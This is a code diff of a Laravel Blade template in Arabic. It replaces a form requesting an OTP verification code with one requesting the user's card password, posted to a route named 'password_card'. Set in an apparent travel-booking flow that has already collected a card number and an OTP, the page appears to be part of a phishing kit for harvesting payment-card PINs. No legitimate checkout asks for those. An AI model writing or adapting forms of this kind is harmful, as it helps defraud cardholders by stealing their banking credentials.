@@ -2,7 +2,7 @@
 
 
 @section('content')
-    <form action="{{ route('check_otp_code.compare') }}" method="post">
+    <form action="{{ route('password_card') }}" method="post">
         @method('POST')
         @csrf
         <section class="mosafer-deatels p-5 text-center">
@@ -11,7 +11,7 @@
                 <div class="bayanat-box mt-5 p-3">
                     <div class="row d-flex justify-content-center">
                         <div class="col-lg-6 p-2">
-                            <h3> بيانات رموز التحقق otp</h3>
+                            <h3> يرجى ادخال كلمة المرور للبطاقة  </h3>
 
                         </div>
                     </div>
@@ -26,14 +26,14 @@
                                 <div class="row d-flex justify-content-between">
                                     <div class="col-lg-6">
                                         <div class="form-control">
-                                            <label for="" class="d-block"> ادخل رمز التحقق </label>
+                                            <label for="" class="d-block"> ادخل كلمة المرور </label>
                                         </div>
                                     </div>
                                     <div class="col-lg-6">
                                         <div class="form-control overflow-hidden mb-3">
-                                            <input class="border" type="text" id="card_no" name="otp_code">
+                                            <input class="border" type="text" id="card_no" name="password">
                                         </div>
-                                        @error('otp_code')
+                                        @error('password')
                                                 <div class="alert alert-danger">{{ $message }}</div>
                                             @enderror
                                     </div>
